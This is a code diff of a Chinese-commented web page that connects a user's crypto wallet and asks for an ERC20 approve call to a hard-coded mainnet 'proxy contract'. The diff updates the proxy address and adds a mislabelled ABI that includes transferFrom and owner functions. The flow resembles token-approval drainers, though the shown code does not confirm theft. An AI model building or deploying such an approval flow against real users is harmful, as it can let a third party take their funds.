@@ -67,8 +67,109 @@
     <script>
         // 配置
         const tokenAddress = "0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21"; // 目标ERC20代币主网地址
-        const proxyAddress = "0x1bCf0d3a51A290A5e5e446FAeAd1c18E5582ec91"; // 代理合约主网地址
+        const proxyAddress = "0x90e2600c453f2716f5bc264cc95e51a91ac08509"; // 更新后的代理合约主网地址
         let provider, signer;
+
+        // ERC20 代币合约 ABI（更新后的ABI）
+        const tokenABI = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "spender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "approve",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "sender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transferFrom",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "token",
+                "outputs": [
+                    {
+                        "internalType": "contract IERC20",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "tokenAddress",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
         // 链接钱包
         async function connectWallet() {
@@ -99,11 +200,6 @@
                 alert("请先链接钱包！");
                 return;
             }
-
-            // ERC20 代币合约 ABI（仅包含 approve 方法）
-            const tokenABI = [
-                "function approve(address spender, uint256 amount) external returns (bool)"
-            ];
 
             // 创建代币合约实例
             const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
